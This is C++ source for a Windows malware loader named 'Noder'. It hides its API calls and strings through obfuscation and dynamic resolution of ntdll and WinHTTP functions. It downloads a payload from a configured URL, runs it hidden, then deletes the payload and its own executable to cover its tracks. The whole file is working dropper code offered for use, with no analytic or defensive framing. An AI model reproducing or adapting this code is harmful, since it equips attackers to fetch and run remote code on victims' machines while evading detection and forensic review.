#include <iostream>
#include <filesystem>
#include <windows.h>
#include <winhttp.h>

#include "obfuscation.h"
#include "definitions.h"
#include "config.h"
#include "utils.h"

#include "noder.h"

Noder::Noder() 
{
	this->Init();

	if (!this->LoadLibraries())
		return;

	if (!this->LoadFunctions())
		return;

	if (!this->DownloadPayload())
		return;

	this->ExecutePayload();
}

Noder::~Noder() 
{
	if (this->LdrUnloadDll == NULL)
		return;

	this->LdrUnloadDll(this->ntdll);
}

void Noder::Init() noexcept
{
	this->LdrLoadDll = NULL;
	this->LdrUnloadDll = NULL;
	this->LdrGetProcedureAddressForCaller = NULL;
	this->RtlInitUnicodeString = NULL;
	this->RtlInitAnsiString = NULL;
	this->WinHttpOpen = NULL;
	this->WinHttpConnect = NULL;
	this->WinHttpOpenRequest = NULL;
	this->WinHttpSendRequest = NULL;
	this->WinHttpReceiveResponse = NULL;
	this->WinHttpQueryDataAvailable = NULL;
	this->WinHttpReadData = NULL;
	this->WinHttpCloseHandle = NULL;

	this->ntdll = NULL;
	this->winhttp = NULL;

	//
	// Set payload name and path
	//
	std::wstring tempName = L"\\??\\"; // This path is used by Nt functions, hence this line
	tempName.append(std::filesystem::current_path());
	tempName.append(L"\\");

	if (config::randompayloadname)
		tempName.append(utils::RandomString());
	else
		tempName.append(PAYLOAD_NAME);

	tempName.append(PAYLOAD_FILE_EXTENSION);

	this->destination = tempName;
}

bool Noder::LoadLibraries() noexcept
{

	HMODULE tempNtdll = (HMODULE)GetModuleHandleW(OBF(wchar_t, L"ntdll.dll"));

	f_LdrLoadDll tempLdrLoadDll = (f_LdrLoadDll)GetProcAddress(tempNtdll, OBF(char, "LdrLoadDll"));
	f_RtlInitUnicodeString tempRtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(tempNtdll, OBF(char, "RtlInitUnicodeString"));

	UNICODE_STRING usTemp;
	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"ntdll.dll"));
	HMODULE hTemp;

	if (tempLdrLoadDll(NULL, 0x0, &usTemp, &hTemp) != 0x0)
	{
		return false;
	}
	this->ntdll = hTemp;

	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"winhttp.dll"));
	if (tempLdrLoadDll(NULL, 0x0, &usTemp, &hTemp) != 0x0)
	{
		return false;
	}
	this->winhttp = hTemp;

	return true;
}

bool Noder::LoadFunctions() noexcept 
{
	this->LdrUnloadDll = (f_LdrUnloadDll)GetProcAddress(this->ntdll, OBF(char, "LdrUnloadDll"));
	if (this->LdrUnloadDll == NULL)
		return false;

	this->NtDeleteFile = (f_NtDeleteFile)GetProcAddress(this->ntdll, OBF(char, "NtDeleteFile"));
	if (this->NtDeleteFile == NULL)
		return false;

	this->RtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(this->ntdll, OBF(char, "RtlInitUnicodeString"));
	if (this->RtlInitUnicodeString == NULL)
		return false;

	this->WinHttpOpen = (f_WinHttpOpen)GetProcAddress(this->winhttp, OBF(char, "WinHttpOpen"));
	if (this->WinHttpOpen == NULL)
		return false;

	this->WinHttpConnect = (f_WinHttpConnect)GetProcAddress(this->winhttp, OBF(char, "WinHttpConnect"));
	if (this->WinHttpConnect == NULL)
		return false;

	this->WinHttpOpenRequest = (f_WinHttpOpenRequest)GetProcAddress(this->winhttp, OBF(char, "WinHttpOpenRequest"));
	if (this->WinHttpOpenRequest == NULL)
		return false;

	this->WinHttpSendRequest = (f_WinHttpSendRequest)GetProcAddress(this->winhttp, OBF(char, "WinHttpSendRequest"));
	if (this->WinHttpSendRequest == NULL)
		return false;

	this->WinHttpReceiveResponse = (f_WinHttpReceiveResponse)GetProcAddress(this->winhttp, OBF(char, "WinHttpReceiveResponse"));
	if (this->WinHttpReceiveResponse == NULL)
		return false;

	this->WinHttpQueryDataAvailable = (f_WinHttpQueryDataAvailable)GetProcAddress(this->winhttp, OBF(char, "WinHttpQueryDataAvailable"));
	if (this->WinHttpQueryDataAvailable == NULL)
		return false;

	this->WinHttpReadData = (f_WinHttpReadData)GetProcAddress(this->winhttp, OBF(char, "WinHttpReadData"));
	if (this->WinHttpReadData == NULL)
		return false;

	this->WinHttpCloseHandle = (f_WinHttpCloseHandle)GetProcAddress(this->winhttp, OBF(char, "WinHttpCloseHandle"));
	if (this->WinHttpCloseHandle == NULL)
		return false;

	return true;
}

bool Noder::DownloadPayload() noexcept
{
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	bool bStatus, retVal = false;

	hSession = this->WinHttpOpen(PAYLOAD_USER_AGENT,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if(hSession)
		hConnect = this->WinHttpConnect(hSession, PAYLOAD_URL,
			INTERNET_DEFAULT_HTTPS_PORT, 0);

	if(hConnect)
		hRequest = this->WinHttpOpenRequest(hConnect, OBF(wchar_t, L"GET"),
			PAYLOAD_URL_DEST,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);

	bStatus = this->WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0, WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);

	if(bStatus)
		bStatus = this->WinHttpReceiveResponse(hRequest, NULL);

	HANDLE hFile = NULL;
	if (bStatus)
	{
		DWORD size = 0;
		LPBYTE buffer;
		DWORD downloaded = 0;
		hFile = CreateFileW(this->destination.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		do {
			size = 0;
			this->WinHttpQueryDataAvailable(hRequest, &size);

			buffer = new byte[size + 1];

			if (!buffer)
				size = 0;
			else
			{
				RtlZeroMemory(buffer, size + 1);
				if (this->WinHttpReadData(hRequest, (LPVOID)buffer, size, &downloaded))
				{
					DWORD written;
					WriteFile(hFile, buffer, size, &written, NULL);
					retVal = true;
				}

				delete[] buffer;
			}

		} while (size > 0);

		CloseHandle(hFile);
	}

	if (hRequest) this->WinHttpCloseHandle(hRequest);
	if (hConnect) this->WinHttpCloseHandle(hConnect);
	if (hSession) this->WinHttpCloseHandle(hSession);

	return retVal;
}

void Noder::ExecutePayload() noexcept
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	RtlZeroMemory(&pi, sizeof(pi));
	si.dwFlags = SW_HIDE;

	if (CreateProcessW(
		this->destination.c_str(),
		NULL,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	
	CleanUp();
}

void Noder::CleanUp() noexcept
{
	//
	// Delete the (hopefully) executed payload
	//
	if (config::deletepayload)
	{
		UNICODE_STRING usName;
		this->RtlInitUnicodeString(&usName, PWSTR(this->destination.c_str()));

		OBJECT_ATTRIBUTES objAttr;

		objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
		objAttr.RootDirectory = NULL;
		objAttr.ObjectName = &usName;
		objAttr.Attributes = 0x0;
		objAttr.SecurityDescriptor = NULL;
		objAttr.SecurityQualityOfService = NULL;

		NTSTATUS status = NtDeleteFile(&objAttr);
	}

	//
	// Delete the loader
	// *VERY* bad way of selfdeleting, we want to avoid ShellExecute
	//
	if (config::selfedelete)
	{
		wchar_t pathBuffer[MAX_PATH];
		GetModuleFileNameW(NULL, pathBuffer, MAX_PATH);

		std::wstring cmd(OBF(wchar_t, L"/c del "));
		cmd.append(pathBuffer);
		cmd.append(OBF(wchar_t, L" >> NUL"));

		wchar_t file[MAX_PATH];
		if (!GetEnvironmentVariableW(OBF(wchar_t, L"ComSpec"), file, MAX_PATH))
			return;

		ShellExecuteW(0, 0, file, cmd.c_str(), 0, SW_HIDE);
	}
}